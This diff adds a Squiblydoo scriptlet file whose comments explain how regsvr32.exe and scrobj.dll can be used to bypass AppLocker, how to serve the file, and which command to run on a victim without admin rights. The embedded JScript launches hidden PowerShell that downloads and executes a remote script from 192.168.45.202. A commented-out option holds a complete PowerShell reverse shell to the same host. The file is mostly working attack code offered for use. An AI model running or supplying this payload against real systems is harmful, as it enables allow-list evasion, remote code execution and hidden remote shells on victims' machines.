@@ -1,0 +1,54 @@
+<?XML version="1.0"?>
+<!--
+  Squiblydoo — Regsvr32 / SCT AppLocker Bypass
+  =============================================
+  regsvr32.exe is a Microsoft-signed binary. It can register COM
+  objects defined in a remote .sct (scriptlet) file. The /u /i:URL
+  flags tell it to load a scriptlet from a URL and run the
+  UnRegisterServer code — all without touching the Allow List.
+
+  WHY IT WORKS:
+    - regsvr32.exe is trusted by AppLocker
+    - scrobj.dll (COM scriptlet host) is also Microsoft-signed
+    - The scriptlet code is JScript/VBScript running inside the
+      regsvr32 process — no new process created for the script itself
+    - Works even without admin rights (uses HKCU COM registration)
+
+  SERVE THIS FILE:
+    python3 -m http.server 80
+
+  RUN ON VICTIM (no admin, no file written to disk):
+    regsvr32 /s /n /u /i:http://192.168.45.202/squiblydoo.sct scrobj.dll
+
+  FLAGS:
+    /s = silent (no dialog box)
+    /n = no call to DllRegisterServer (skip the register step)
+    /u = unregister mode (calls UnRegisterServer = our payload)
+    /i:URL = pass URL as argument to DllInstall
+
+  CUSTOMIZE: Replace the WScript.Shell command below with your payload.
+-->
+
+<scriptlet>
+  <registration
+    progid="TESTING"
+    classid="{A1112221-0000-0000-3000-000DA00DABFC}">
+
+    <script language="JScript">
+      <![CDATA[
+        // This runs when regsvr32 calls DllUnregisterServer (/u flag)
+        var r = new ActiveXObject("WScript.Shell");
+
+        // Option 1: Download and run a PowerShell script
+        r.Run("powershell -w hidden -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://192.168.45.202/payload.ps1')\"", 0, false);
+
+        // Option 2: Run a command directly
+        // r.Run("cmd /c whoami > C:\\Windows\\Temp\\out.txt", 0, false);
+
+        // Option 3: Launch a reverse shell (replace IP/port)
+        // r.Run("powershell -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('192.168.45.202',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$ob=[text.encoding]::ASCII.GetBytes($o+' PS> ');$s.Write($ob,0,$ob.Length)};$c.Close()\"", 0, false);
+      ]]>
+    </script>
+
+  </registration>
+</scriptlet>
